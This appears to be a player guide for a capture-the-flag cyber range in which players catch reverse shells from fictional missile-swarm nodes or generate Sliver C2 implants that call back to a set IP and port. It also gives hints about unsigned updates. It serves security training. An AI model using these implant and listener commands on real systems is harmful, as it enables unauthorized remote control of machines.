# GILDED GUARDIAN — PLAYER GUIDE

## Connect

```
ssh <username>@<RANGE_ENDPOINT> -p 2222
```

Scoreboard: `http://<RANGE_ENDPOINT>:8080`

Reset the exercise anytime: `reset-range`

---

## Your Mission

Defend AO Rizzo from incoming Mantis cruise missile swarms. You have 60 minutes. If 3 strike assets reach their targets, the mission fails.

Read the Mantis design documentation. The vulnerabilities are in the architecture.

---

## Two Ways to Play

### Option A: Quick Start (reverse shell)

The attack station is pre-configured. Beacons from the swarm are already calling back. You just need to catch them.

**Step 1:** Start a listener
```bash
catch-shell
```

A Python shell from a swarm node will connect within 30 seconds. You are now on a node inside the swarm.

**Step 2:** Figure out where you are
```python
import os
print(os.listdir('/etc/mantis'))
cfg = open('/etc/mantis/config.json').read()
print(cfg)
```

**Step 3:** Use what you learned to complete the mission.

> How this differs from the real competition: the real CTF uses Sliver C2 for sessions, which gives you commands like `execute`, `download`, `upload`, `ls`. Here you get a raw Python interpreter. Same challenge, different tooling.

---

### Option B: Competition-Accurate (Sliver C2)

This is how the real CTF works.

**Step 1:** Start Sliver server (one person only)
```bash
sliver-server
```
First run takes 60-90 seconds to unpack.

**Step 2:** In the Sliver console, generate an implant
```
generate --http 172.21.0.100:8888 --os linux --arch amd64 --save /var/www/golden.exe --skip-symbols
```
This overwrites the default golden.exe with a real Sliver implant. Takes 1-2 minutes to compile.

**Step 3:** Start the HTTP listener
```
http --lhost 172.21.0.100 --lport 8888
```

**Step 4:** The beacons will re-download the new golden.exe within 30 seconds. Sliver sessions will appear:
```
[*] Session opened ...
```

**Step 5:** Interact with a session
```
sessions
use <session-id>
```

You are now on a swarm node via Sliver. Use `execute`, `download`, `ls`, etc.

---

## What You Don't Know (figure it out)

- What type of node you landed on
- What tools are available on the node
- Where they are on the filesystem
- The swarm topology
- How to reach other nodes
- What the vulnerabilities are

Study the Mantis technical specifications. Everything you need is documented.

---

## Useful Hints (read only if stuck)

<details>
<summary>Hint 1 (after 5 min stuck)</summary>
The beacons are already calling back. What port are they trying to reach?
</details>

<details>
<summary>Hint 2 (after 10 min stuck)</summary>
Something is trying to connect to you on port 4444. Or if using Sliver, check your sessions.
</details>

<details>
<summary>Hint 3 (after 15 min stuck)</summary>
Read the config file on the node you landed on. It's at /etc/mantis/config.json
</details>

<details>
<summary>Hint 4 (after 20 min stuck)</summary>
The config shows every IP in the swarm. What does verify_signatures: false mean?
</details>

<details>
<summary>Hint 5 (after 25 min stuck)</summary>
You have curl on the node. It's not where you'd expect. Try /opt/tools/
</details>

<details>
<summary>Hint 6 (after 30 min stuck)</summary>
You don't have to kill every node. What do strike assets DEPEND on to function?
</details>
